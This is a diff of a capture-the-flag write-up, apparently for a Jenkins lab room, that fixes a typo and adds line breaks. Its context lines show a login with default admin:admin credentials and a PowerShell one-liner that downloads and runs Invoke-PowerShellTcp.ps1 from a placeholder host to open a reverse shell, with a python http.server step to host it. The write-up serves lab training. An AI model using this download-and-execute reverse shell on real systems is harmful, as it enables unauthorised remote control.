@@ -66,11 +66,11 @@ Since in this room there is this ****:****, I tried admin:admin.It worked!</p>
 
 ![image](https://github.com/user-attachments/assets/711c3b4f-8877-4014-9f6e-0cbe192c1e06)
 
-<p>I decided to explore the <em>Project</em> section.</p>
+<p>I decided to explore the <em>Project</em> section.</p><br>
 
 ![image](https://github.com/user-attachments/assets/410de7cc-bf99-4915-b904-6b22ba5128a3)
 
-<p>Next I clicked on <em>Configre</em>.</p>
+<p>Next I clicked on <em>Configure</em>.</p><br>
 
 ![image](https://github.com/user-attachments/assets/822a6e46-066c-4762-8770-d494a86626b9)
 
@@ -78,7 +78,7 @@ Since in this room there is this ****:****, I tried admin:admin.It worked!</p>
 
 <p>Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: <code>powershell iex</code> (<em>New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port</em></p>
 
-<p></p>
+<p><br></p>
 
 <p><strong>You first need to download the Powershell script and make it available for the server to download. You can do this by creating an http server with python: <code>python3 -m http.server</code></strong></p>
 
